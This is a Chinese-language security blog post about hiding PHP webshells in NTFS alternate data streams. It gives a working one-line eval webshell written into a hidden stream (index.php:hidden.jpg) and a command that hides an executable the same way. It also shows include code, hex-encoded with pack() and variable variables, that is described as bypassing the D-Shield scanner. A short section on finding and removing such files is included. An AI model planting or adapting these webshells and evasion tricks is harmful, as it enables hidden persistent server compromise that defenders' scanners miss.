## 首先我们先了解下什么是ADS隐藏

说到ADS就肯定要了解什么是NTFS（文件系统不过多说明）。

NTFS交换数据流有一定的隐蔽性，这让一些恶意软件有了可趁之机，通过ADS将自己隐藏起来，从此就从“资源管理器”中消失了。

ADS数据流（定义）：NTFS将文件/目录作为属性和属性值(属性的内容)的集合来处理，一个文件可以有若干不同的属性，也可以同时拥有若干个相同的属性。数据流属性$DATA就可以有两种：未命名的数据流属性和命名的数据流属性。未命名数据流通常容纳用户存储的数据，它的大小就是文件的大小；而命名数据流一般都是操作系统为特定目的设置的，其大小和内容往往对用户是不可见的，这种命名数据流又称作NTFS交换数据流(ADS，Alternative
Data Streams)[2]。

## 在真实环境中出现的样子

    
    
    1.echo ^<?php @eval($_POST['chopper']);?^> > index.php:hidden.jpg  
      
    <?php @include(PACK('H*','696E6465782E7068703A68696464656E2E6A7067'));?>  
      
    2.type muma.ext test.txt:muma.exe  
    .....

这条全集生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。

当然还有其他的用法，比如我生成一个恶意的后门，不仅仅是PHPSHELL

我们也可以生成EXE/JSP/ASP等等。

## 针对ADS隐藏Shell的处理方法

![1626767843_60f681e36e7df03f4f1c3.png!small?1626767843548](https://image.3001.net/images/20210720/1626767843_60f681e36e7df03f4f1c3.png!small?1626767843548)

![1626767901_60f6821d6c25bc6ab07bf.png!small?1626767902061](https://image.3001.net/images/20210720/1626767901_60f6821d6c25bc6ab07bf.png!small?1626767902061)

在实际的文件管理中是无法看到隐藏的文件的，包括dir 等命令都无法看到问题文件

当我们使用notepad index.php:hidden.jpg时却可以正常打开文件

![1626767956_60f6825418c2d2a0ddee5.png!small?1626767956158](https://image.3001.net/images/20210720/1626767956_60f6825418c2d2a0ddee5.png!small?1626767956158)

  

1.针对恶意文件，我们只要把index.php删除就可以解决

2.针对文件包含，我们可以利用扫描工具直接找到，也可以解决恶意文件

3.对文件属性进行审查，可以发现文件的不同(未进行特殊隐藏)

![1626768461_60f6844d72ecfd6b8fdf0.png!small?1626768461440](https://image.3001.net/images/20210720/1626768461_60f6844d72ecfd6b8fdf0.png!small?1626768461440)

## ADS shell 可以怎么用

### 1.文件包含

一个正常文件里把这个ADS文件include进去，<?php
include(‘index.php:hidden.jpg’)?>，这样子就可以正常解析我们的一句话了。

在进行变形绕过扫描器：

这边要解决的是include函数，如何让它检测不出来有可疑引用文件呢？

在某次应急响应事件中，获取到一段代码，这里拿来改造一下。代码如下：

    
    
    <?php
    @include(PACK('H*','xx'));
    ?>

利用PHP pack() 函数将index.php:hidden.jpg进行hex编码

    
    
    <?php @include(PACK('H*','696E6465782E7068703A68696464656E2E6A7067'));?>

进一步利用PHP 可变变量进行二次转换，最后得到绕过D盾扫描的姿势如下：

    
    
    <?php 
    $a="696E6465782E7068703"."A68696464656E2E6A7067";
    $b="a";
    include(PACK('H*',$$b))
    ?>

## 总结

技术难度不高，现在依然可以利用，不算过时，发现难度较高，算是一个比较好玩的小知识点

